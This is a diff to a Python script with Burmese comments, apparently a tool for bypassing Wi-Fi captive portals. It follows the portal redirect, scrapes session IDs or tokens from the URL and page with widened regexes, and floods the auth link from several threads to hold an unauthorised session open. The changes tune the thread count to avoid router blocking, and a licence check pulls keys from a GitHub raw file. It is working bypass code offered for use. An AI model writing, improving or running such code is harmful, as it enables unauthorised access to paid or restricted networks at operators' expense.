@@ -8,7 +8,6 @@ import random
 import sys
 import datetime
 import subprocess
-import hashlib
 import os
 import uuid
 from urllib.parse import urlparse, parse_qs, urljoin
@@ -23,8 +22,8 @@ from rich.text import Text
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 console = Console()
 
-# အလွန်အကျွံမဖြစ်စေရန် Thread နဲ့ Interval ကို ချိန်ညှိထားသည်
-PING_THREADS = 8
+# Cloud/Router Block မဖြစ်စေရန် Thread အရေအတွက်ကို ထိန်းညှိထားသည်
+PING_THREADS = 7
 PING_INTERVAL = 0.5 
 
 # COLOR SYSTEM
@@ -38,6 +37,7 @@ RESET = "\033[0m"
 logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(message)s", datefmt="%H:%M:%S")
 stop_event = threading.Event()
 
+# GitHub Database URL
 URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
 
 BABY_LOGO = """
@@ -73,7 +73,7 @@ def get_hwid():
     except: return "MOE-DEFAULT-999"
 
 def get_current_gateway():
-    """လက်ရှိချိတ်ထားသော Network ရဲ့ Router IP ကို Dynamic ယူခြင်း"""
+    """လက်ရှိချိတ်ထားသော Network ၏ Gateway IP ကို ရှာဖွေခြင်း"""
     try:
         gateway = subprocess.check_output("ip route show | grep default | awk '{print $3}'", shell=True).decode().strip()
         return gateway if gateway else "192.168.110.1"
@@ -138,12 +138,13 @@ def check_license_hacker_style():
         sys.exit()
 
 # ===============================
-# BYPASS ENGINE (MULTI-MODE)
+# BYPASS ENGINE (ENHANCED PARSING)
 # ===============================
 def start_bypass_process():
     while not stop_event.is_set():
         try:
             session = requests.Session()
+            # Redirect များကို အဆုံးထိ လိုက်ရန် allow_redirects=True ထားသည်
             r = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
             
             if r.status_code == 204:
@@ -153,12 +154,18 @@ def start_bypass_process():
             portal_url = r.url
             r1 = session.get(portal_url, timeout=10, verify=False)
             
-            # SID သို့မဟုတ် Token ရှာဖွေခြင်း
+            # --- IMPROVED SID PARSING ---
             params = parse_qs(urlparse(portal_url).query)
-            sid = params.get('sessionId', [None])[0] or params.get('token', [None])[0]
+            # Parameter နာမည်အမျိုးမျိုးကို ရှာဖွေခြင်း
+            sid = (params.get('sessionId') or 
+                   params.get('session_id') or 
+                   params.get('token') or 
+                   params.get('auth_id') or 
+                   [None])[0]
             
+            # URL ထဲမှာ မတွေ့လျှင် HTML စာသားထဲတွင် Regex ဖြင့် ထပ်ရှာခြင်း
             if not sid:
-                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r1.text) or re.search(r'token=([a-zA-Z0-9]+)', r1.text)
+                sid_match = re.search(r'(?:sessionId|session_id|token|auth_id)=([a-zA-Z0-9_\-]+)', r1.text)
                 sid = sid_match.group(1) if sid_match else None
             
             if sid:
@@ -176,15 +183,18 @@ def start_bypass_process():
                 def pulse_ping():
                     while not stop_event.is_set():
                         try:
-                            res = session.get(auth_link, timeout=5)
+                            # Gateway သို့ ပုံမှန် Request ပို့ပြီး Session အရှင်ထားခြင်း
+                            session.get(auth_link, timeout=5)
                             sys.stdout.write(f"{GREEN}[✓] {mode_label} | SID: {sid[:12]}.. | GW: {current_gw} | ACTIVE{RESET}\n")
                             sys.stdout.flush()
                         except: pass
                         time.sleep(PING_INTERVAL)
 
+                # Thread များကို စတင်ခြင်း
                 for _ in range(PING_THREADS):
                     threading.Thread(target=pulse_ping, daemon=True).start()
                 
+                # အင်တာနက် ရ၊ မရ စစ်ဆေးခြင်း
                 while True:
                     try:
                         if session.get("http://www.google.com", timeout=3).status_code == 200:
@@ -194,7 +204,7 @@ def start_bypass_process():
             else:
                 sys.stdout.write(f"{RED}[-] TARGET SID NOT FOUND. RETRYING...{RESET}\n")
                 time.sleep(3)
-        except Exception as e:
+        except Exception:
             time.sleep(5)
 
 if __name__ == "__main__":
